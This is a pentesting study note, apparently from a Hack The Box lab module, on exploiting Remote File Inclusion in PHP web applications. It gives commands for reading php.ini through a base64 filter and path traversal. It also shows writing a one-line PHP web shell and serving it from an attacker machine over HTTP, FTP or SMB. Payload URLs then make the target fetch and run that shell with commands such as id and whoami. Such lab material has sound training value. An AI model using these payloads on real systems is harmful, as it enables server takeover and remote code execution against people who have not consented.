A table of functions that will allow to include remote files (Remote URL) can be found in the end of [[Attacks/Web/SQL Injection/MariaDB (MySQL)/In-band/Union Based/Intro]], in case that code execution isn't allowed we can still use it for enumeration trough SSRF.

To verify for RFI we should first look for the `allow_url_include` setting.

The PHP configuration file location is (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, x.y is the version (we can start from top to bottom) and use base64 filter, it's also adviced to use burp or cURL for this:
```shell-session
Wildland4958@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/<version>/apache2/php.ini"
```

Decode the configuration and find the `allow_url_include` setting:
```shell-session
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

A more reliable way to determine if the function is vulnerable is to try and include a URL, we should start with a local one like:
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://127.0.0.1:80/index.php
```

If we get the page and not the source code it means that RCE is possible as well.

**Note:** It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

## Remote Code Execution with RFI

The first step is to create a malicious script in the language of the web app.

Example for PHP script:
```shell-session
Wildland4958@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## HTTP

Start a Python web server:
```shell-session
Wildland4958@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
```

Include a file with your IP and port:
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

**Tip:** We can examine the connection on our machine to ensure the request is being sent as we specified it. For example, if we saw an extra extension (.php) was appended to the request, then we can omit it from our payload

## FTP

Start basic FTP server with Python:
```shell-session
Wildland4958@htb[/htb]$ sudo python -m pyftpdlib -p 21
```

We can specify credentials in the URL if needed as follow:
```shell-session
Wildland4958@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<attacker ip>/<payload>&cmd=id'
```

## SMB

If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.

Use Impacket's smbserver.py to spin up an SMB server:
```shell-session
Wildland4958@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
```

Include a script:
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```